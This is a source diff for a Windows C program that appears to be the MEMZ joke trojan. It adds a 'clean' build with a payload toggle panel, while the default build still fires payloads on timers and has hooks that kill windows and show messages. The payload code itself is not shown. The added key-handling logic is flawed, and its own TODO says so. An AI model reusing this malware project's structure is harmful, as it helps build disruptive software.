@@ -2,10 +2,15 @@
 
 int scrw, scrh;
 
+#ifdef CLEAN
+HFONT font;
+#endif
+
 void main() {
 	scrw = GetSystemMetrics(SM_CXSCREEN);
 	scrh = GetSystemMetrics(SM_CYSCREEN);
 
+#ifndef CLEAN
 	int argc;
 	LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
@@ -95,14 +100,76 @@ void main() {
 
 	for (int p = 0; p < nPayloads; p++) {
 		Sleep(payloads[p].delay);
-		CreateThread(NULL, NULL, &payloadThread, payloads[p].payloadFunction, NULL, NULL);
+		CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
 	}
 
 	for (;;) {
 		Sleep(10000);
 	}
+
+#else // CLEAN
+	InitCommonControls();
+
+	LOGFONT lf;
+	GetObject(GetStockObject(DEFAULT_GUI_FONT), sizeof(LOGFONT), &lf);
+	font = CreateFont(lf.lfHeight, lf.lfWidth,
+		lf.lfEscapement, lf.lfOrientation, lf.lfWeight,
+		lf.lfItalic, lf.lfUnderline, lf.lfStrikeOut, lf.lfCharSet,
+		lf.lfOutPrecision, lf.lfClipPrecision, lf.lfQuality,
+		lf.lfPitchAndFamily, lf.lfFaceName);
+
+	WNDCLASSEX c;
+	c.cbSize = sizeof(WNDCLASSEX);
+	c.lpfnWndProc = WindowProc;
+	c.lpszClassName = L"MEMZPanel";
+	c.style = CS_HREDRAW | CS_VREDRAW;
+	c.cbClsExtra = 0;
+	c.cbWndExtra = 0;
+	c.hInstance = NULL;
+	c.hIcon = 0;
+	c.hCursor = 0;
+	c.hbrBackground = (HBRUSH)(COLOR_3DFACE+1);
+	c.lpszMenuName = NULL;
+	c.hIconSm = 0;
+
+	RegisterClassEx(&c);
+
+	RECT rect;
+	rect.left = 0;
+	rect.right = WINDOWWIDTH;
+	rect.top = 0;
+	rect.bottom = WINDOWHEIGHT;
+
+	AdjustWindowRect(&rect, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
+
+	HWND hwnd = CreateWindowEx(0, L"MEMZPanel", L"MEMZ Clean Version - Payload Panel", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
+		50, 50, rect.right-rect.left, rect.bottom-rect.top, NULL, NULL, GetModuleHandle(NULL), NULL);
+
+	for (int p = 0; p < nPayloads; p++) {
+		payloads[p].btn = CreateWindowW(L"BUTTON", payloads[p].name, WS_VISIBLE | WS_CHILD | WS_TABSTOP | BS_PUSHLIKE | BS_AUTOCHECKBOX | BS_NOTIFY,
+			(p%COLUMNS)*BTNWIDTH+SPACE*(p%COLUMNS+1), (p/COLUMNS)*BTNHEIGHT + SPACE*(p/COLUMNS+1), BTNWIDTH, BTNHEIGHT,
+			hwnd, NULL, (HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE), NULL);
+		SendMessage(payloads[p].btn, WM_SETFONT, (WPARAM)font, TRUE);
+
+		CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
+	}
+
+	SendMessage(hwnd, WM_SETFONT, (WPARAM)font, TRUE);
+
+	ShowWindow(hwnd, SW_SHOW);
+	UpdateWindow(hwnd);
+	
+	CreateThread(NULL, NULL, &keyboardThread, NULL, NULL, NULL);
+
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0) > 0) {
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+#endif
 }
 
+#ifndef CLEAN
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
 		killWindows();
@@ -200,5 +267,57 @@ DWORD WINAPI ripMessageThread(LPVOID parameter) {
 
 	return 0;
 }
+#else // CLEAN
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+	PAINTSTRUCT ps;
+	HDC hdc;
+	
+	switch (msg) {
+	case WM_DESTROY:
+		ExitProcess(0);
+		break;
+	case WM_COMMAND:
+		if (wParam == BN_CLICKED) {}
+		break;
+	case WM_PAINT:
+		hdc = BeginPaint(hwnd, &ps);
+		SelectObject(hdc, font);
+		TextOut(hdc, 10, WINDOWHEIGHT - 20, L"Press SHIFT+ESC to stop all payloads! Press CTRL+SHIFT+S to increase speed.", 75);
+		EndPaint(hwnd, &ps);
+		return 0;
+	default:
+		return DefWindowProc(hwnd, msg, wParam, lParam);
+		break;
+	}
+
+	return 0;
+}
+
+DWORD WINAPI keyboardThread(LPVOID lParam) {
+	for (;;) {
+		// TODO FIX IT
+		if (GetKeyState(VK_SHIFT | VK_ESCAPE) < 0) {
+			for (int p = 0; p < nPayloads; p++) {
+				SendMessage(payloads[p].btn, BM_SETCHECK, BST_UNCHECKED, NULL);
+			}
+
+			RECT rect;
+			HWND desktop = GetDesktopWindow();
+			GetWindowRect(desktop, &rect);
+
+			RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
+		} else if (GetKeyState(VK_SHIFT | VK_CONTROL | 'S') < 0) {
+			for (int p = 0; p < nPayloads; p++) {
+				payloads[p].runtime += 2000;
+				payloads[p].times += 10;
+			}
+		}
+
+		Sleep(100);
+	}
+
+	return 0;
+}
+#endif
 
 
